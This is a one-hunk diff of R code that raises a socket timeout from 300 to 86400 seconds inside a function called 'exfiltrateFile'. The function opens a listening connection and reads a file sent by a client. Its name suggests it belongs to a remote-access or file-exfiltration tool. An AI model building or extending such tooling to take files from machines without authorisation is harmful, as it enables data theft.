@@ -36,7 +36,7 @@ exfiltrateFile <- function(socket, host, secondaryPort, command) {
     if (is.na(fileSize) || fileSize < 0) {
       signalCondition(simpleError("Download Aborted by Client"))
     }
-    fileSocket <- socketConnection(host=host, port=secondaryPort, blocking=TRUE, server=TRUE, timeout=300, open="rb")
+    fileSocket <- socketConnection(host=host, port=secondaryPort, blocking=TRUE, server=TRUE, timeout=86400, open="rb")
     readBin(fileSocket, "raw", n=fileSize)
   }, error=function(e){
     abortDownload <<- TRUE
